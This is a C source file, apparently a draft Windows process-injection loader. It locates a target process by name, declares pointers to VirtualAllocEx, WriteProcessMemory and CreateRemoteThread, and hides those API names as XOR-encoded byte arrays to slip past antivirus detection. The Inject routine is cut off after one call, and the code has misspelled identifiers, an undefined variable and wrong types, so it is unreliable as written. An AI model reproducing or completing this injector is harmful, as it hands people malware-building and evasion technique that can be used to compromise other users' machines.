#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
//#include "resources.h"

LPVOID (WINAPI * pVirtualAllocEx)(
    HANDLE hProccess,
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD flAllocationType,
    DWORD flProtect

);

BOOL (WINAPI * pWriteProccessMemory)(
    HANDLE hProccess,
    LPVOID lpBaseAddress,
    LPCVOID lpBuffer,
    SIZE_T nSize,
    SIZE_T *lpNumberOfBytesWritten


);

HANDLE (WINAPI * pCreateRemoteThread)(
    HANDLE hProccess,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    SIZE_T dwStackSize,
    LPTHREAD_START_ROUTINE lpStartAddress,
    LPVOID lpParameter,
    DWORD dwCreationFlags,
    LPWORD lpThreadId


);


char KEY[] = "imthepurpl3guy";

void XOR(char * data, size_t data_len, char * key, size_t key_len)
{
    int j = 0;
    for(int i =0;i<data_len;i++)
    {
        if(j==key_len-1)
            j = 0;
        //This goes through and basically sets every index of i a char and xor's it with the key's index.
        //Once the end of the key has been reached it simply xor's with the key over again.

        data[i] = data[i] ^ key[j];
        j++;

    }
}

int FindTarget(const char *procname)
{
    HANDLE hProcSnap;
    PROCESSENTRY32 pe32;
    int pid = 0;

    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(INVALID_HANDLE_VALUE == hProcSnap) return 0;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if(!Process32First(hProcSnap, &pe32))
    {
        CloseHandle(hProcSnap);
        return 0;

    }
    while(Process32Next(hProcSnap, &pe32))
    {
        if(lstrcmpiA(procname,pe32.szExeFile) == 0)
        {
            pid = pe32.trh32ProcessID;
            break;

        }
    }
    CloseHandle(hProcSnap);
    return pid;


}

int Inject(HANDLE hProc, unsigned char * payload, unsigned int paylaod_len)
{
    LPVOID pRemoteCode = NULL;
    HANDLE hThread = NULL;
    unsigned char sVirtualAllocEx[] = { 0x3f, 0x4, 0x6, 0x1c, 0x10, 0x11, 0x19, 0x33, 0x1c, 0x0, 0x5c, 0x4, 0x30, 0x1 };
    unsigned char sWriteProccessMemory[] = { 0x3e, 0x1f, 0x1d, 0x1c, 0x0, 0x20, 0x7, 0x1d, 0x13, 0xf, 0x56, 0x14, 0x6, 0x34, 0xc, 0x0, 0x1b, 0x1a, 0x1c };
    unsigned char sCreateRemoteThread[] = { 0x2a, 0x1f, 0x11, 0x9, 0x11, 0x15, 0x27, 0x17, 0x1d, 0x3, 0x47, 0x2, 0x21, 0x11, 0x1b, 0x8, 0x15, 0xc };
    XOR((char *) sVirtualAllocEx, sizeof(sVirtualAllocEx), KEY,sizeof(KEY));
    XOR((char *) sWriteProccessMemory, sizeof(sWriteProccessMemory), KEY,sizeof(KEY));
    XOR((char *) sCreateRemoteThread, sizeof(sCreateRemoteThread), KEY,sizeof(KEY));
    //the handles are now created and they are decrypted now we can continue.
    pVirtualAllocEx = GetProcAddress(GetModuleHandle("kernel32.dll"),virtualAllocEx);
    



}
